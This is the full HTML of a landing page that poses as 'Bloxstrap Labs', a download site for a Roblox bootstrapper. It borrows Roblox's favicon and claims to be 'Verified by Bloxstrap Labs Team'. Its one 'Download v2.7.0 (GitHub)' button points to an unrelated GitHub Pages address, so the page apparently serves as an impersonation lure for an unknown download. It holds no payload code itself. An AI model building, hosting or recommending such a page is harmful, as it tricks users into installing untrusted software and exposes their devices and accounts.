<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bloxstrap Labs | The ultimate Roblox bootstrapper</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        :root { --bg: #0d1117; --text: #c9d1d9; --btn: #238636; }
        body { margin: 0; font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .logo { width: 120px; margin-bottom: 20px; }
        h1 { font-size: 40px; color: white; margin: 0; }
        .desc { font-size: 18px; color: #8b949e; margin: 10px 0 30px; }
        .download-btn { 
            background: var(--btn); color: white; padding: 14px 30px; border-radius: 6px; 
            font-size: 18px; font-weight: bold; text-decoration: none; transition: 0.2s; 
        }
        .download-btn:hover { background: #2ea043; transform: scale(1.02); }
    </style>
</head>
<body>
    <img src="https://bloxstraplabs.com/favicon.ico" class="logo" onerror="this.src='https://www.roblox.com/favicon.ico'">
    <h1>Bloxstrap Labs</h1>
    <p class="desc">The most powerful open-source bootstrapper for Roblox.</p>
    <a href="https://whymakser.github.io/discors" class="download-btn">Download v2.7.0 (GitHub)</a>
    <p style="margin-top: 25px; color: #484f58; font-size: 12px;">Verified by Bloxstrap Labs Team</p>
</body>
</html>
